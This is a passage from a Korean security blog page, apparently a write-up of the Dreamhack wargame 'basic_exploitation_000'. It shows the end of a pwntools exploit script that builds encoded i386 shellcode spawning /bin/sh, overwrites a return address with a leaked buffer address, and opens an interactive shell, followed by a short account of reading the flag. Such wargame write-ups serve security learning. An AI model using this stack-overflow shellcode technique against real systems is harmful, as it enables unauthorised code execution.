<span class="n">data</span><span class="p">,</span> <span class="n">dump</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">')'</span><span class="p">)</span>

<span class="n">data</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="c1"># constructing payload
</span>
<span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">'linux'</span><span class="p">)</span>
<span class="n">avoid</span> <span class="o">=</span> <span class="p">{</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x09</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0a</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0b</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0c</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0d</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x20</span><span class="s">'</span><span class="p">}</span>

<span class="n">tmp_shellcode</span><span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
<span class="n">shellcode</span><span class="o">=</span> <span class="n">encoders</span><span class="p">.</span><span class="n">i386</span><span class="p">.</span><span class="n">ascii_shellcode</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">tmp_shellcode</span><span class="p">,</span> <span class="n">avoid</span><span class="p">)</span>
<span class="n">shellcode_len</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">ret_add</span><span class="o">=</span><span class="n">p32</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span>
<span class="n">payload</span> <span class="o">+=</span><span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x84</span><span class="o">-</span><span class="n">shellcode_len</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">ret_add</span>

<span class="k">print</span><span class="p">(</span><span class="n">hexdump</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>

<span class="c1"># gdb.attach(p)
# raw_input("1")
</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div> <p>그 결과, 목표 시스템의 쉘을 획득할 수 있었고, ls 명령어로 플래그 파일의 위치를 확인한 후 (find 명령어로 해도 되는데 나는 ls 명령어로 눈에 보이는 곳에 있는지 확인하고 없다면 find 명령어를 사용하는 쪽을 선호한다) cat 명령어를 이용해 플래그를 알아냈다.</p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="http://localhost:4000/blog/dreamhack_system_hacking/step5-basic_exploitation_000" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About TouBVA </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="http://localhost:4000/assets/img/authors/toubva.jpeg" alt="TouBVA" /> </div> <div class="col-md-6"> <p class="author_bio">A Security Researcher, now concentrating on Security Consulting.</p> <p>Email : touBVa@gmail.com</p> <p>Website : https://toubva.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/TouBVa" target="_blank"><i class="fab fa-github fa-fw"></i></a> <a class="social-link" href="https://www.linkedin.com/in/johndoe" target="_blank"><i class="fab fa-linkedin fa-fw"></i></a> <a class="social-link" href="https://www.youtube.com/channel/UCSfLBFFfNU9r6ihfei6VeJw" target="_blank"><i class="fab fa-youtube fa-fw"></i></a> <a class="social-link" href="https://www.facebook.com/johndoe" target="_blank"><i class="fab fa-facebook fa-fw"></i></a> <a class="social-link" href="https://www.twitter.com/johndoe" target="_blank"><i class="fab fa-twitter fa-fw"></i></a> </p> </div> </div> </div> </div> </div><!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <div class="blog_post_comments"> <div id="disqus_thread"><script> var disqus_config = function () { this.page.url = "http://localhost:4000/blog/dreamhack_system_hacking/step5-basic_exploitation_000"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/dreamhack_system_hacking/system-hacking-step5-wargame000"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://toubva.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> </div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About TouBVa</div> <div class="card-body"> <p class="author_bio">Welcome to my world!</p><!-- Place this tag where you want the github button to render. --> <a class="github-button" href="https://github.com/touBVa/touBVa.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star my blog on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#dreamhack_system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/dreamhack_system_hacking">dreamhack_system_hacking</a> </li> <a name="dreamhack_system_hacking"></a> <div id="#system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/system_hacking">system_hacking</a> </li> <a name="system_hacking"></a> <div id="#protostar"></div> <li class="tag-head"> <a href="/blog/categories/protostar">protostar</a> </li> <a name="protostar"></a> <div id="#certification_study"></div> <li class="tag-head"> <a href="/blog/categories/certification_study">certification_study</a> </li> <a name="certification_study"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="http://localhost:4000/">Home</a> </li> <li> <a href="http://localhost:4000/about">About</a> </li> <li> <a href="http://localhost:4000/blog">Blog</a> </li> <li> <a href="http://localhost:4000/contact">Contact</a> </li> </div> </div> </div> </div> </div> <div class="col-lg-12" id="newsletter_footer"><!-- Mailchimp Newletters --> <form action=""method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate> <div id="mc_embed_signup_scroll_footer"> <label for="mce-EMAIL_footer"> Signup for Weekly Email Newsletters :D</label> <input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL_footer" placeholder="email address" required> <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups--> <div style="position: absolute; left: -5000px;" aria-hidden="true"> <input type="text" name="b_50bab1c85eae24ecfb0f68361_3a2dd721d0" tabindex="-1" value=""> </div><br /> <div class="clear"> <input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe_footer" class="btn btn-lg btn-success"> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/touBVa"> TouBVa</a>. Hosted at <a href="https://pages.github.com">Github</a>. Subscribe via <a href=" /feed.xml ">RSS</a> </p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="http://localhost:4000/assets/js/mode-switcher.js"></script> <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> </body> </html>
